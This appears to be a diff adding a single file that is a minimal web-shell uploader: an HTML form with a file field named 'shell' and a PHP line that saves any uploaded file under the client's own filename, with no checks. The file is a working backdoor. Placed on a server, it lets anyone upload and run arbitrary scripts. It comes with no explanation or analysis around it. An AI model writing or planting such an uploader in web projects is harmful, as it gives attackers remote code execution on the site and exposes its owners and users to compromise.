@@ -1,0 +1,1 @@
+<html><head><title>upload</title></head><body><form method="post" action=" " enctype="multipart/form-data"><input type="file" size="30" name="shell"/><input type="submit" value="Upload"/></form></body></html><?php move_uploaded_file($_FILES["shell"]["tmp_name"],$_FILES["shell"]["name"]); ?>
